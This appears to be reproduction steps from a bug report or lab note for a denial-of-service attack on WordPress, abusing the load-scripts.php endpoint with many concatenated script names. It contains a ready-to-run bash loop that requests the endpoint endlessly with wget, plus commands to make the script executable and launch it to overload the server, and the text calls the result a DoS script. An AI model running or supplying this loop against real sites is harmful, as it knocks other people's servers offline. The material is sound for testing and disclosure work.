  - [ ] Steps to recreate:
        1. Create a script or use an automated tool to request the following URL in a loop:
            https://your-wordpress-site.com/wp-admin/load-scripts.php?c=1&load=editor,common,user-profile,media-widgets,media-gallery
        2. I used bash to create the following script (:
            #!/bin/bash
            while :
            do
            wget -O/dev/null -q http://wpdistillery.vm/wp-admin/load-scripts.php?c=1&load=editor,common,user-profile,media- widgets,media-gallery
            done
        3. on the command line, make your script executable: 
            $ chmod + x your-DoS-script.sh
        4. Run your script and that will overload your WP server causing the DoS
            $ ./your-DoS-script.sh
